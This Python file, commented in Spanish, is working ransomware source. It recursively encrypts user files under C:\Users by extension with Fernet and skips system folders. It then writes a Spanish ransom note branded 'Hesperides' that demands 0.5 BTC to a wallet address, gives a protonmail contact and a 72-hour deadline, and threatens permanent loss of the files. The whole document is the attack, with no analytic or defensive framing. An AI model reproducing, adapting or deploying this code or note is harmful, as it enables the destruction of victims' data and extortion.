import os
from cryptography.fernet import Fernet
from concurrent.futures import ThreadPoolExecutor

EXCLUIR_CARPETAS = [
    'Program Files',
    'Program Files (x86)',
    'Windows',
    '$Recycle.Bin',
    'AppData',
    'logs',
    'C:\\Users\\rafa\\Desktop\\scripts'  # Carpeta adicional a excluir
]

EXTENSIONES_PERMITIDAS = [
    '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw',  # imágenes
    '.mp3', '.mp4', '.m4a', '.aac', '.ogg', '.flac', '.wav', '.wma', '.aiff', '.ape',  # música y sonido
    '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp',  # vídeos y películas
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',  # Microsoft Office
    '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt',  # OpenOffice, Adobe, LaTeX, Markdown, etc.
    '.yml', '.yaml', '.json', '.xml', '.csv',  # datos estructurados
    '.db', '.sql', '.dbf', '.mdb', '.iso',  # bases de datos e imágenes de disco
    '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css',  # tecnologías web
    '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx',  # código fuente en C
    '.java', '.class', '.jar',  # código fuente en Java
    '.ps', '.bat', '.vb', '.vbs',  # scripts para Windows
    '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift',  # scripts para Linux/Mac
    '.go', '.py', '.pyc', '.bf', '.coffee',  # otros archivos de código fuente
    '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak'  # formatos comprimidos
]

def generar_llave():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def cargar_llave():
    return open("key.key", "rb").read()

def encriptar_archivo(item, key):
    try:
        with open(item, "rb") as file:
            file_data = file.read()
        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(file_data)
        with open(item, "wb") as file:
            file.write(encrypted_data)
    except PermissionError:
        print(f"No se pudo acceder al archivo: {item}")
    except Exception as e:
        print(f"Error al encriptar el archivo {item}: {e}")

def obtener_archivos_en_directorio(path):
    archivos = []
    for root, _, files in os.walk(path):
        if any(excluir in root for excluir in EXCLUIR_CARPETAS):
            continue
        for file in files:
            if os.path.splitext(file)[1].lower() in EXTENSIONES_PERMITIDAS:
                archivos.append(os.path.join(root, file))
    return archivos

if __name__ == "__main__":
    # Directorio que se va a encriptar
    path_to_encrypt = "C:\\Users"

    # Obtener todos los archivos en el directorio y subdirectorios
    items = obtener_archivos_en_directorio(path_to_encrypt)

    # Generar y cargar la llave
    generar_llave()
    key = cargar_llave()

    # Encriptar los archivos en paralelo usando ThreadPoolExecutor
    with ThreadPoolExecutor() as executor:
        executor.map(lambda item: encriptar_archivo(item, key), items)
    ransom_note = """
    ------------------------------------------
              ¡ATENCIÓN!
    ------------------------------------------

    Ha sido infectado por el ransomware Hesperides. Todos sus archivos importantes han sido cifrados y no pueden ser accedidos. Esto incluye, pero no se limita a, documentos, fotos, vídeos y bases de datos.

    Para recuperar sus archivos, siga las siguientes instrucciones:

    1. **No intente desencriptar sus archivos sin nuestra ayuda.**
       Cualquier intento de hacerlo puede resultar en la pérdida permanente de sus datos.

    2. **Debe pagar un rescate en Bitcoin.**
       El monto del rescate es de 0.5 BTC. 

    3. **Realice el pago a la siguiente cartera de Bitcoin:**
       `1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa`

    4. **Una vez realizado el pago:**
       Envíe un correo electrónico a `hesperides_support@protonmail.com` con el siguiente asunto: `Pago de Rescate Hesperides`
       En el cuerpo del mensaje incluya:
       - La dirección desde la que envió el pago.
       - Su identificador de víctima: `VIC-ID-XXXXXX` (reemplazar con su identificador único que debería haberse proporcionado en otro archivo)

    5. **Recibirá instrucciones de desencriptación:**
       Una vez confirmado el pago, le enviaremos una herramienta de desencriptación junto con la clave única para recuperar sus archivos.

    ¡IMPORTANTE!

    - El plazo para realizar el pago es de 72 horas. Si no se realiza el pago en este período, su clave de desencriptación será eliminada y sus archivos serán irrecuperables.
    - Si no sabe cómo comprar Bitcoins, utilice los siguientes recursos:
       - [LocalBitcoins.com](https://localbitcoins.com)
       - [Coinbase.com](https://www.coinbase.com)
       - [Binance.com](https://www.binance.com)

    Recuerde, solo nosotros podemos ayudarle a recuperar sus archivos. Cualquier intento de recuperación por terceros puede resultar en la pérdida permanente de sus datos.

    Lamentamos los inconvenientes y le agradecemos su cooperación.

    ------------------------------------------
              Hesperides Ransomware
    ------------------------------------------
                            ___
                          _/`.-'`.
                _      _/` .  _.'
       ..:::::.(_)   /` _.'_./
     .oooooooooo\\ \\o/.-'__.'o.
    .ooooooooo`._\\_|_.'`oooooob.
  .ooooooooooooooooooooo&&oooooob.
 .oooooooooooooooooooo&@@@@@@oooob.
.ooooooooooooooooooooooo&&@@@@@ooob.
doooooooooooooooooooooooooo&@@@@ooob
doooooooooooooooooooooooooo&@@@oooob
dooooooooooooooooooooooooo&@@@ooooob
dooooooooooooooooooooooooo&@@oooooob
`dooooooooooooooooooooooooo&@ooooob'
 `doooooooooooooooooooooooooooooob'
  `doooooooooooooooooooooooooooob'
   `doooooooooooooooooooooooooob'
    `doooooooooooooooooooooooob'
     `doooooooooooooooooooooob'
     `dooooooooobodoooooooob'
       `doooooooob dooooooob'
         `"""""""' `""""""'
    """
    

    # Crear el archivo de readme en el directorio de trabajo actual
    with open("readme.txt", "w") as file:
        file.write(ransom_note)
